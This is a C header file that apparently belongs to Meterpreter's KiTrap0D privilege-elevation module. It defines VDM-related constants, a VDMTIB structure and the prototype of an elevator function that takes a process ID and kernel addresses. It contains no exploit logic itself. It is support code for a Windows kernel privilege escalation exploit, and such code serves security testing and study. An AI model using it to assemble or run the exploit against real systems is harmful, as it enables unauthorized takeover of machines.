/*!
 * @file kitrap0d.h
 */

#ifndef _METERPRETER_SOURCE_ELEVATOR_KITRAP0D_H
#define _METERPRETER_SOURCE_ELEVATOR_KITRAP0D_H

#define KSTACKSIZE		1024

#define EFLAGS_TF_MASK	0x00000100 // trap flag

#ifndef PAGE_SIZE
#define PAGE_SIZE		0x1000
#endif

enum
{ 
	VdmStartExecution = 0,
	VdmInitialize     = 3
};

typedef struct _VDMTIB
{
	ULONG   Size;
	PVOID   Padding0;
	PVOID   Padding1;
	CONTEXT Padding2;
	CONTEXT VdmContext;
	DWORD   Padding3[1024];
} VDMTIB, * LPVDMTIB;

VOID elevator_kitrap0d( DWORD dwProcessId, DWORD dwKernelBase, DWORD dwOffset );

#endif
